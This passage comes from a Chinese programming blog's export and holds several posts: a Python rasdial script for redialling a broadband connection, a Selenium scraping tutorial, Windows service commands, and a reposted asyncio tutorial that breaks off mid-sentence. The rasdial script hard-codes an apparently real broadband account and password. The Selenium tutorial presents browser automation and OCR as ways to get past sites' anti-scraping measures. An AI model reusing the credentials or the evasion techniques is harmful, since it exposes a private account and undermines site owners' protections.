    <content type="text"><![CDATA[在一次实战中客户要求切换vps的宽带账号，使用windows命令操作 windows下rasdial命令介绍123456789101112C:\&gt;rasdial /?用法: rasdial entryname [username [password|*]] [/DOMAI [/PHONE:phonenumber] [/CALLBACK:callbackn [/PHONEBOOK:phonebookfile] [/PREFIXSUFFIX rasdial [entryname] /DISCONNECT rasdial 有关联机隐私信息，请参阅 &quot;http://go.microsoft.com/fwlink/?LinkId=104288&quot; 连接宽带 rasdial 宽带连接 057128280802 34795 断开连接 rasdial 宽带连接 /disconnect 集成到脚本中12345678910111213141516171819def connect(self): name = &quot;宽带连接&quot; username =&apos;057128280802&apos;# 填写你的宽带名字 password = &quot;34795&quot;# 填写你的宽带密码 cmd_str = &quot;rasdial %s %s %s&quot; % (name, username, password) res = os.system(cmd_str) if res == 0: print(&quot;connect successful&quot;) else: print(res) time.sleep(5)def disconnect(self): name = &quot;宽带连接&quot; cmdstr = &quot;rasdial %s /disconnect&quot; % name os.system(cmdstr) time.sleep(5)def check_kuandai(self): self.disconnect() 示例：]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Selenium模拟浏览器爬虫详解]]></title>
    <url>%2F2019%2F05%2F02%2Fpythonselenium%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[Selenium 是一个用于web应用程序自动化测试的工具，直接运行在浏览器当中，支持chrome、firefox等主流浏览器。可以通过代码控制与页面上元素进行交互（点击、输入等），也可以获取指定元素的内容。 一.背景 Selenium 是一个用于web应用程序自动化测试的工具，直接运行在浏览器当中，支持chrome、firefox等主流浏览器。可以通过代码控制与页面上元素进行交互（点击、输入等），也可以获取指定元素的内容。 劣势： 相比于抓包→构造请求→解析返回值的爬虫，由于Selenium需要生成一个浏览器环境，所有操作（与元素交互、获取元素内容等）均需要等待页面加载完毕后才可以继续进行，所以速度相比构造请求的慢很多。对于为了反爬做了特殊处理的展示内容，如字体加密（参考猫眼）、图片替换数字（参考自如）等，可能取不到想要的数据。 使用图片替换数字的自如： image-20190107215702089 优势： a. 不需要做复杂的抓包、构造请求、解析数据等，开发难度相对要低一些。 b. 其访问参数跟使用浏览器的正常用户一模一样，访问行为也相对更像正常用户，不容易被反爬虫策略命中。 c.生成的浏览器环境可以自动运行 JS 文件，所以不用担心如何逆向混淆过的JS文件生成用作人机校验的参数，如马蜂窝酒店评论的人机校验参数_sn，网易云音乐评论的人机校验参数params、encSecKey。可以自行抓包查看。 d. 如果需要抓取同一个前端页面上面来自不同后端接口的信息，如OTA酒店详情页的酒店基础信息、价格、评论等，使用Selenium可以在一次请求中同时完成对三个接口的调用，相对方便。 二、实现 1.环境python3.6MacosSelenium3.浏览器驱动（webdriver） 加载浏览器环境需要下载对应的浏览器驱动，此处选择 Chrome。 下载地址：http://npm.taobao.org/mirrors/chromedriver/ ， 选择合适的版本下载解压后放在随便一个位置即可。 4.hello world from selenium import webdriver 这里填刚刚下载的驱动的路径 path = /Applications/Google Chrome.app/Contents/chromedriver driver = webdriver.Chrome(executable_path=path) url = http://hotel.qunar.com/city/beijing_city/ driver.get(url) 运行上述代码，会打开一个浏览器，并且加载去哪儿的酒店列表页 这时候可以通过webdriver自带的一些的一些方法获取元素内容或者与元素进行交互。 image-20190108224445170 #返回ID = js_block_beijing_city_7810的元素信息 hotel_info = driver.find_element_by_id( js_block_beijing_city_7810 ) print(hotel_info.text) #返回 展示在列表页的酒店信息 #同理，可以find_element_by_[class_name|name] 等，均可完成查询。 也可以通过方法 find_elements查找符合某条件的一组元素，以列表的形式返回。 image-20190108225039418 #当需要查询的唯一标识带有空格时，可以使用find_elements_by_css_selector，否则会报错。 hotel_list = driver.find_elements_by_css_selector(“[class= b_result_box js_list_block b_result_commentbox ]”) print(hotel_list) #返回酒店列表的全部信息。 5.关闭图片加载 在不需要抓取图片的情况下，可以设置不加载图片，节约时间，这样属于调整本地设置，在传参上并不会有异常。 from selenium import webdriver chrome_opt = webdriver.ChromeOptions() prefs={“profile.managed_default_content_settings.images”:2} chrome_opt.add_experimental_option(“prefs”,prefs) path = #驱动路径 browser_noPic = webdriver.Chrome(executable_path=path,chrome_options=chrome_opt) 三、使用webdriver与元素进行交互 1.模拟鼠标点击 image-20190108230139238 hotel_info = driver.find_element_by_id(“js_plugin_tag_beijing_city_7810”) hotel.info.click() #进入酒店详情页 2.模拟键盘输入 hotel_search = driver.find_element_by_id(“jxQ”) hotel_search.send_keys(“如”) hotel_search.send_keys(“如家”) #由于搜索框输入的第一个字会被选中，所以需要第二次才能完整输入，当然也可以模拟按键盘的 →(右键)取消选中后再次输入。 3.模拟下拉 webdriver中对鼠标的操作的方法封装在ActionChains类中 ，使用前要先导入ActionChains类： from selenium.webdriver.common.action_chains import ActionChains “””在页面顶部、底部个找了一个元素，并模拟鼠标从顶到底的滑动””” start = driver.find_element_by_class_name( e_above_header ) target = driver.find_element_by_class_name( qn_footer ) ActionChains(driver).drag_and_drop(start,target).perform() 此外，webdiver还提供丰富的交互功能，比如鼠标悬停、双击、按住左键等等，此处不展开介绍。 四、一个完整的模拟浏览器爬虫 from selenium import webdriver from selenium.webdriver.common.action_chains import ActionChains import time 这里填刚刚下载的驱动的路径 path = /Users/./Desktop/chromedriver driver = webdriver.Chrome(executable_path=path) url = http://hotel.qunar.com/city/beijing_city/ driver.get(url) time.sleep(6) #等待页面加载完再进行后续操作 “””在页面顶部、底部个找了一个元素，并模拟鼠标从顶到底的滑动””” start = driver.find_element_by_class_name( e_above_header ) target = driver.find_element_by_class_name( qn_footer ) ActionChains(driver).drag_and_drop(start,target).perform() time.sleep(5) #等待页面加载完再进行后续操作 hotel_link_list = driver.find_elements_by_css_selector(“[class= item_price js_hasprice ]”) print(“在此页面共有酒店”,len(hotel_link_list),”家”) windows = driver.window_handles #此处可以爬整个页面任何想要想要的元素 list_hotel_info=[] def hotel_info_clawer(): list_hotel_info.append([driver.find_element_by_class_name(&quot;info&quot;).text, driver.find_element_by_class_name(&quot;js-room-table&quot;).text, driver.find_element_by_class_name(&quot;dt-module&quot;).text]) for i in range(len(hotel_link_list)): hotel_link_list[i].click() driver.switch_to.window(windows[-1]) #切换到刚打开的酒店详情页 hotel_info_clawer() driver.close() #关闭已经爬完的酒店详情页 print(&quot;已经抓取酒店&quot;,i,&quot;家&quot;) #后面可以补充翻页继续抓取的部分 五、使用截图+OCR抓取关键数据 对于做了特殊处理的信息，如上述的猫眼电影的票房信息、自如的价格等，不适用于直接获取制定元素的信息进行抓取，可以使用截图+OCR的方式抓取此类数据。 以自如的房租为例： image-20190112201939908 from selenium import webdriver 这里填刚刚下载的驱动的路径 path = /Applications/Google Chrome.app/Contents/chromedriver driver = webdriver.Chrome(executable_path=path) url = http://www.ziroom.com/z/vr/61715463.html driver.get(url) price = diver.find_element_by_class_name( room_price ) print(price.text)#由于自如的价格用图片做了替换，这样并不能获取到实际价格，需要获取图片再做ocr处理 “对指定元素部分截图再保存” price.screenshot( /Users/./Desktop/price.png ) 安装ocr工具： Tesseract是一个开源的OCR引擎，能识别100多种语言（中，英，韩，日，德，法…等等），但是Tesseract对手写的识别能力较差，仅适用于打印字体。 //仅安装tesseract，不安装训练工具和其他语音包，需要识别中文的话得额外下载 //下载地址：https://github.com/tesseract-ocr/tessdata brew install tesseract 使用Tesseract： tesseract ~/price.png result //识别图片并将结果存在result里面 在python下使用Tesseract： 首先安装依赖包：pip install pytesseract import pytesseract from PIL import Image open imageimage = Image.open( price.png ) code = pytesseract.image_to_string(image) print(code)]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>selenium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows 服务]]></title>
    <url>%2F2019%2F05%2F01%2Fwindows_serv%2F</url>
    <content type="text"><![CDATA[快速创建windows服务,节约启动服务的时间 添加的服务 Redis数据库服务 Mysql数据库服务 MongoDB数据库服务 创建服务添加redis服务添加mongodb服务添加mysql服务服务操作启动服务1net start ServiceName 停止服务1net stop ServiceName 删除服务1sc delete ServiceName]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python异步编程]]></title>
    <url>%2F2019%2F04%2F26%2Fpython%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[这篇文章是看了崔庆才的博客转载的。网路io，同步、异步、进程、协成有一定的了解 前言在执行一些 IO 密集型任务的时候，程序常常会因为等待 IO 而阻塞。比如在网络爬虫中，如果我们使用 requests 库来进行请求的话，如果网站响应速度过慢，程序一直在等待网站响应，最后导致其爬取效率是非常非常低的。 为了解决这类问题，本文就来探讨一下 Python 中异步协程来加速的方法，此种方法对于 IO 密集型任务非常有效。如将其应用到网络爬虫中，爬取效率甚至可以成百倍地提升。 注：本文协程使用 async/await 来实现，需要 Python 3.5 及以上版本。 基本了解在了解异步协程之前，我们首先得了解一些基础概念，如阻塞和非阻塞、同步和异步、多进程和协程。 2.1 阻塞阻塞状态指程序未得到所需计算资源时被挂起的状态。程序在等待某个操作完成期间，自身无法继续干别的事情，则称该程序在该操作上是阻塞的。 常见的阻塞形式有：网络 I/O 阻塞、磁盘 I/O 阻塞、用户输入阻塞等。阻塞是无处不在的，包括 CPU 切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。如果是多核 CPU 则正在执行上下文切换操作的核不可被利用。 2.2 非阻塞程序在等待某操作过程中，自身不被阻塞，可以继续运行干别的事情，则称该程序在该操作上是非阻塞的。 非阻塞并不是在任何程序级别、任何情况下都可以存在的。仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。 非阻塞的存在是因为阻塞存在，正因为某个操作阻塞导致的耗时与效率低下，我们才要把它变成非阻塞的。 2.3 同步不同程序单元为了完成某个任务，在执行过程中需靠某种通信方式以协调一致，称这些程序单元是同步执行的。 例如购物系统中更新商品库存，需要用“行锁”作为通信信号，让不同的更新请求强制排队顺序执行，那更新库存的操作是同步的。 简言之，同步意味着有序。 2.4 异步为完成某个任务，不同程序单元之间过程中无需通信协调，也能完成任务的方式，不相关的程序单元之间可以是异步的。 例如，爬虫下载网页。调度程序调用下载程序后，即可调度其他任务，而无需与该下载任务保持通信以协调行为。不同网页的下载、保存等操作都是无关的，也无需相互通知协调。这些异步操作的完成时刻并不确定。 简言之，异步意味着无序。 2.5 多进程多进程就是利用 CPU 的多核优势，在同一时间并行地执行多个任务，可以大大提高执行效率。 2.6 协程协程，英文叫做 Coroutine，又称微线程，纤程，协程是一种用户态的轻量级线程。 协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈。因此协程能保留上一次调用时的状态，即所有局部状态的一个特定组合，每次过程重入时，就相当于进入上一次调用的状态。 协程本质上是个单进程，协程相对于多进程来说，无需线程上下文切换的开销，无需原子操作锁定及同步的开销，编程模型也非常简单。 我们可以使用协程来实现异步操作，比如在网络爬虫场景下，我们发出一个请求之后，需要等待一定的时间才能得到响应，但其实在这个等待过程中，程序可以干许多其他的事情，等到响应得到之后才切换回来继续处理，这样可以充分利用 CPU 和其他资源，这就是异步协程的优势。 异步协程用法接下来让我们来了解下协程的实现，从 Python 3.4 开始，Python 中加入了协程的概念，但这个版本的协程还是以生成器对象为基础的，在 Python 3.5 则增加了 async/await，使得协程的实现更加方便。 Python 中使用协程最常用的库莫过于 asyncio，所以本文会以 asyncio 为基础来介绍协程的使用。 首先我们需要了解下面几个概念： event_loop：事件循环，相当于一个无限循环，我们可以把一些函数注册到这个事件循环上，当满足条件发生的时候，就会调用对应的处理方法。coroutine：中文翻译叫协程，在 Python 中常指代为协程对象类型，我们可以将协程对象注册到时间循环中，它会被事件循环调用。我们可以使用 async 关键字来定义一个方法，这个方法在调用时不会立即被执行，而是返回一个协程对象。task：任务，它是对协程对象的进一步封装，包含了任务的各个状态。future：代表将来执行或没有执行的任务的结果，实际上和 task 没有本质区别。另外我们还需要了解 async/await 关键字，它是从 Python 3.5 才出现的，专门用于定义协程。其中，async 定义一个协程，await 用来挂起阻塞方法的执行。 3.1 定义协程首先我们来定义一个协程，体验一下它和普通进程在实现上的不同之处，代码如下： 123456789101112import asyncioasync def execute(x): print(&apos;Number:&apos;, x)coroutine = execute(1)print(&apos;Coroutine:&apos;, coroutine)print(&apos;After calling execute&apos;)loop = asyncio.get_event_loop()loop.run_until_complete(coroutine)print(&apos;After calling loop&apos;) 运行结果：12345Coroutine: &lt;coroutine object execute at 0x1034cf830&gt;After calling executeNumber: 1After calling loop 首先我们引入了 asyncio 这个包，这样我们才可以使用 async 和 await，然后我们使用 async 定义了一个 execute() 方法，方法接收一个数字参数，方法执行之后会打印这个数字。 随后我们直接调用了这个方法，然而这个方法并没有执行，而是返回了一个 coroutine 协程对象。随后我们使用 get_event_loop() 方法创建了一个事件循环 loop，并调用了 loop 对象的 run_until_complete() 方法将协程注册到事件循环 loop 中，然后启动。最后我们才看到了 execute() 方法打印了输出结果。 可见，async 定义的方法就会变成一个无法直接执行的 coroutine 对象，必须将其注册到事件循环中才可以执行。 上文我们还提到了 task，它是对 coroutine 对象的进一步封装，它里面相比 coroutine 对象多了运行状态，比如 running、finished 等，我们可以用这些状态来获取协程对象的执行情况。 在上面的例子中，当我们将 coroutine 对象传递给 run_until_complete() 方法的时候，实际上它进行了一个操作就是将 coroutine 封装成了 task 对象，我们也可以显式地进行声明，如下所示：1234567891011121314151617import asyncioasync def execute(x): print(&apos;Number:&apos;, x) return xcoroutine = execute(1)print(&apos;Coroutine:&apos;, coroutine)print(&apos;After calling execute&apos;)loop = asyncio.get_event_loop()task = loop.create_task(coroutine)print(&apos;Task:&apos;, task)loop.run_until_complete(task)print(&apos;Task:&apos;, task)print(&apos;After calling loop&apos;) 运行结果：1234567891011121314Coroutine: &lt;coroutine object execute at 0x10e0f7830&gt;After calling executeTask: &lt;Task pending coro=&lt;execute() running at demo.py:4&gt;&gt;Number: 1Task: &lt;Task finished coro=&lt;execute() done, defined at demo.py:4&gt; result=1&gt;After calling loopCoroutine: &lt;coroutine object execute at 0x10e0f7830&gt;After calling executeTask: &lt;Task pending coro=&lt;execute() running at demo.py:4&gt;&gt;Number: 1Task: &lt;Task finished coro=&lt;execute() done, defined at demo.py:4&gt; result=1&gt;After calling loop 这里我们定义了 loop 对象之后，接着调用了它的 create_task() 方法将 coroutine 对象转化为了 task 对象，随后我们打印输出一下，发现它是 pending 状态。接着我们将 task 对象添加到事件循环中得到执行，随后我们再打印输出一下 task 对象，发现它的状态就变成了 finished，同时还可以看到其 result 变成了 1，也就是我们定义的 execute() 方法的返回结果。 另外定义 task 对象还有一种方式，就是直接通过 asyncio 的 ensure_future() 方法，返回结果也是 task 对象，这样的话我们就可以不借助于 loop 来定义，即使我们还没有声明 loop 也可以提前定义好 task 对象，写法如下： 12345678910111213141516import asyncioasync def execute(x): print(&apos;Number:&apos;, x) return xcoroutine = execute(1)print(&apos;Coroutine:&apos;, coroutine)print(&apos;After calling execute&apos;)task = asyncio.ensure_future(coroutine)print(&apos;Task:&apos;, task)loop = asyncio.get_event_loop()loop.run_until_complete(task)print(&apos;Task:&apos;, task)print(&apos;After calling loop&apos;) 运行结果：1234567Coroutine: &lt;coroutine object execute at 0x10aa33830&gt;After calling executeTask: &lt;Task pending coro=&lt;execute() running at demo.py:4&gt;&gt;Number: 1Task: &lt;Task finished coro=&lt;execute() done, defined at demo.py:4&gt; result=1&gt;After calling loop 发现其效果都是一样的。 3.2 绑定回调另外我们也可以为某个 task 绑定一个回调方法，来看下面的例子： 12345678910111213141516171819import asyncioimport requestsasync def request(): url = &apos;https://www.baidu.com&apos; status = requests.get(url) return statusdef callback(task): print(&apos;Status:&apos;, task.result())coroutine = request()task = asyncio.ensure_future(coroutine)task.add_done_callback(callback)print(&apos;Task:&apos;, task)loop = asyncio.get_event_loop()loop.run_until_complete(task)print(&apos;Task:&apos;, task) 12345678910111213141516171819import asyncioimport requests async def request(): url = &apos;https://www.baidu.com&apos; status = requests.get(url) return status def callback(task): print(&apos;Status:&apos;, task.result()) coroutine = request()task = asyncio.ensure_future(coroutine)task.add_done_callback(callback)print(&apos;Task:&apos;, task) loop = asyncio.get_event_loop()loop.run_until_complete(task)print(&apos;Task:&apos;, task) 在这里我们定义了一个 request() 方法，请求了百度，返回状态码，但是这个方法里面我们没有任何 print() 语句。随后我们定义了一个 callback() 方法，这个方法接收一个参数，是 task 对象，然后调用 print() 方法打印了 task 对象的结果。这样我们就定义好了一个 coroutine 对象和一个回调方法，我们现在希望的效果是，当 coroutine 对象执行完毕之后，就去执行声明的 callback() 方法。 那么它们二者怎样关联起来呢？很简单，只需要调用 add_done_callback() 方法即可，我们将 callback() 方法传递给了封装好的 task 对象，这样当 task 执行完毕之后就可以调用 callback() 方法了，同时 task 对象还会作为参数传递给 callback() 方法，调用 task 对象的 result() 方法就可以获取返回结果了。 运行结果： 123Task: &lt;Task pending coro=&lt;request() running at demo.py:5&gt; cb=[callback() at demo.py:11]&gt;Status: &lt;Response [200]&gt;Task: &lt;Task finished coro=&lt;request() done, defined at demo.py:5&gt; result=&lt;Response [200]&gt;&gt; Task: &lt;Task pending coro=&lt;request() running at demo.py:5&gt; cb=[callback() at demo.py:11]&gt;Status: Task: &lt;Task finished coro=&lt;request() done, defined at demo.py:5&gt; result=&gt;实际上不用回调方法，直接在 task 运行完毕之后也可以直接调用 result() 方法获取结果，如下所示：1234567891011121314151617import asyncioimport requestsasync def request(): url = &apos;https://www.baidu.com&apos; status = requests.get(url) return statuscoroutine = request()task = asyncio.ensure_future(coroutine)print(&apos;Task:&apos;, task)loop = asyncio.get_event_loop()loop.run_until_complete(task)print(&apos;Task:&apos;, task)print(&apos;Task Result:&apos;, task.result()) import asyncioimport requests async def request(): url = ‘https://www.baidu.com&#39; status = requests.get(url) return status coroutine = request()task = asyncio.ensure_future(coroutine)print(‘Task:’, task) loop = asyncio.get_event_loop()loop.run_until_complete(task)print(‘Task:’, task)print(‘Task Result:’, task.result())1234567891011121314运行结果是一样的：Task: &lt;Task pending coro=&lt;request() running at demo.py:4&gt;&gt;Task: &lt;Task finished coro=&lt;request() done, defined at demo.py:4&gt; result=&lt;Response [200]&gt;&gt;Task Result: &lt;Response [200]&gt;123Task: &lt;Task pending coro=&lt;request() running at demo.py:4&gt;&gt;Task: &lt;Task finished coro=&lt;request() done, defined at demo.py:4&gt; result=&lt;Response [200]&gt;&gt;Task Result: &lt;Response [200]&gt;3.3 多任务协程上面的例子我们只执行了一次请求，如果我们想执行多次请求应该怎么办呢？我们可以定义一个 task 列表，然后使用 asyncio 的 wait() 方法即可执行，看下面的例子： import asyncioimport requests async def request(): url = ‘https://www.baidu.com&#39; status = requests.get(url) return status tasks = [asyncio.ensure_future(request()) for _ in range(5)]print(‘Tasks:’, tasks) loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) for task in tasks: print(‘Task Result:’, task.result())12```这里我们使用一个 for 循环创建了五个 task，组成了一个列表，然后把这个列表首先传递给了 asyncio 的 wait() 方法，然后再将其注册到时间循环中，就可以发起五个任务了。最后我们再将任务的运行结果输出出来，运行结果如下： Tasks: [&lt;Task pending coro=&lt;request() running at demo.py:5&gt;&gt;, &lt;Task pending coro=&lt;request() running at demo.py:5&gt;&gt;, &lt;Task pending coro=&lt;request() running at demo.py:5&gt;&gt;, &lt;Task pending coro=&lt;request() running at demo.py:5&gt;&gt;, &lt;Task pending coro=&lt;request() running at demo.py:5&gt;&gt;]Task Result: Task Result: Task Result: Task Result: Task Result: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660可以看到五个任务被顺次执行了，并得到了运行结果。3.4 协程实现前面说了这么一通，又是 async，又是 coroutine，又是 task，又是 callback，但似乎并没有看出协程的优势啊？反而写法上更加奇怪和麻烦了，别急，上面的案例只是为后面的使用作铺垫，接下来我们正式来看下协程在解决 IO 密集型任务上有怎样的优势吧！上面的代码中，我们用一个网络请求作为示例，这就是一个耗时等待的操作，因为我们请求网页之后需要等待页面响应并返回结果。耗时等待的操作一般都是 IO 操作，比如文件读取、网络请求等等。协程对于处理这种操作是有很大优势的，当遇到需要等待的情况的时候，程序可以暂时挂起，转而去执行其他的操作，从而避免一直等待一个程序而耗费过多的时间，充分利用资源。为了表现出协程的优势，我们需要先创建一个合适的实验环境，最好的方法就是模拟一个需要等待一定时间才可以获取返回结果的网页，上面的代码中使用了百度，但百度的响应太快了，而且响应速度也会受本机网速影响，所以最好的方式是自己在本地模拟一个慢速服务器，这里我们选用 Flask。如果没有安装 Flask 的话可以执行如下命令安装：pip3 install flask1pip3 install flask然后编写服务器代码如下：from flask import Flaskimport timeapp = Flask(__name__)@app.route(&apos;/&apos;)def index(): time.sleep(3) return &apos;Hello!&apos;if __name__ == &apos;__main__&apos;: app.run(threaded=True)123456789101112from flask import Flaskimport time app = Flask(__name__) @app.route(&apos;/&apos;)def index(): time.sleep(3) return &apos;Hello!&apos; if __name__ == &apos;__main__&apos;: app.run(threaded=True)这里我们定义了一个 Flask 服务，主入口是 index() 方法，方法里面先调用了 sleep() 方法休眠 3 秒，然后接着再返回结果，也就是说，每次请求这个接口至少要耗时 3 秒，这样我们就模拟了一个慢速的服务接口。注意这里服务启动的时候，run() 方法加了一个参数 threaded，这表明 Flask 启动了多线程模式，不然默认是只有一个线程的。如果不开启多线程模式，同一时刻遇到多个请求的时候，只能顺次处理，这样即使我们使用协程异步请求了这个服务，也只能一个一个排队等待，瓶颈就会出现在服务端。所以，多线程模式是有必要打开的。启动之后，Flask 应该默认会在 127.0.0.1:5000 上运行，运行之后控制台输出结果如下： * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)1 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)接下来我们再重新使用上面的方法请求一遍：import asyncioimport requestsimport timestart = time.time()async def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) response = requests.get(url) print(&apos;Get response from&apos;, url, &apos;Result:&apos;, response.text)tasks = [asyncio.ensure_future(request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))end = time.time()print(&apos;Cost time:&apos;, end - start)123456789101112131415161718import asyncioimport requestsimport time start = time.time() async def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) response = requests.get(url) print(&apos;Get response from&apos;, url, &apos;Result:&apos;, response.text) tasks = [asyncio.ensure_future(request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) end = time.time()print(&apos;Cost time:&apos;, end - start)在这里我们还是创建了五个 task，然后将 task 列表传给 wait() 方法并注册到时间循环中执行。运行结果如下：Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Cost time: 15.0493681430816651234567891011Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Cost time: 15.049368143081665可以发现和正常的请求并没有什么两样，依然还是顺次执行的，耗时 15 秒，平均一个请求耗时 3 秒，说好的异步处理呢？其实，要实现异步处理，我们得先要有挂起的操作，当一个任务需要等待 IO 结果的时候，可以挂起当前任务，转而去执行其他任务，这样我们才能充分利用好资源，上面方法都是一本正经的串行走下来，连个挂起都没有，怎么可能实现异步？想太多了。要实现异步，接下来我们再了解一下 await 的用法，使用 await 可以将耗时等待的操作挂起，让出控制权。当协程执行的时候遇到 await，时间循环就会将本协程挂起，转而去执行别的协程，直到其他的协程挂起或执行完毕。所以，我们可能会将代码中的 request() 方法改成如下的样子：async def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) response = await requests.get(url) print(&apos;Get response from&apos;, url, &apos;Result:&apos;, response.text)12345async def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) response = await requests.get(url) print(&apos;Get response from&apos;, url, &apos;Result:&apos;, response.text)仅仅是在 requests 前面加了一个 await，然而执行以下代码，会得到如下报错：Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Cost time: 15.048935890197754Task exception was never retrievedfuture: &lt;Task finished coro=&lt;request() done, defined at demo.py:7&gt; exception=TypeError(&quot;object Response can&apos;t be used in &apos;await&apos; expression&quot;,)&gt;Traceback (most recent call last): File &quot;demo.py&quot;, line 10, in request status = await requests.get(url)TypeError: object Response can&apos;t be used in &apos;await&apos; expression123456789101112Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Waiting for http://127.0.0.1:5000Cost time: 15.048935890197754Task exception was never retrievedfuture: &lt;Task finished coro=&lt;request() done, defined at demo.py:7&gt; exception=TypeError(&quot;object Response can&apos;t be used in &apos;await&apos; expression&quot;,)&gt;Traceback (most recent call last): File &quot;demo.py&quot;, line 10, in request status = await requests.get(url)TypeError: object Response can&apos;t be used in &apos;await&apos; expression这次它遇到 await 方法确实挂起了，也等待了，但是最后却报了这么个错，这个错误的意思是 requests 返回的 Response 对象不能和 await 一起使用，为什么呢？因为根据官方文档说明，await 后面的对象必须是如下格式之一：A native coroutine object returned from a native coroutine function，一个原生 coroutine 对象。A generator-based coroutine object returned from a function decorated with types.coroutine()，一个由 types.coroutine() 修饰的生成器，这个生成器可以返回 coroutine 对象。An object with an await__ method returning an iterator，一个包含 __await 方法的对象返回的一个迭代器。可以参见：https://www.python.org/dev/peps/pep-0492/#await-expression。reqeusts 返回的 Response 不符合上面任一条件，因此就会报上面的错误了。那么有的小伙伴就发现了，既然 await 后面可以跟一个 coroutine 对象，那么我用 async 把请求的方法改成 coroutine 对象不就可以了吗？所以就改写成如下的样子：import asyncioimport requestsimport timestart = time.time()async def get(url): return requests.get(url)async def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) response = await get(url) print(&apos;Get response from&apos;, url, &apos;Result:&apos;, response.text)tasks = [asyncio.ensure_future(request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))end = time.time()print(&apos;Cost time:&apos;, end - start)123456789101112131415161718192021import asyncioimport requestsimport time start = time.time() async def get(url): return requests.get(url) async def request(): url = &apos;http://127.0.0.1:5000&apos; print(&apos;Waiting for&apos;, url) response = await get(url) print(&apos;Get response from&apos;, url, &apos;Result:&apos;, response.text) tasks = [asyncio.ensure_future(request()) for _ in range(5)]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) end = time.time()print(&apos;Cost time:&apos;, end - start)这里我们将请求页面的方法独立出来，并用 async 修饰，这样就得到了一个 coroutine 对象，我们运行一下看看：Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Cost time: 15.1343178749084471234567891011Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Waiting for http://127.0.0.1:5000Get response from http://127.0.0.1:5000 Result: Hello!Cost time: 15.134317874908447还是不行，它还不是异步执行，也就是说我们仅仅将涉及 IO 操作的代码封装到 async 修饰的方法里面是不可行的！我们必须要使用支持异步操作的请求方式才可以实现真正的异步，所以这里就需要 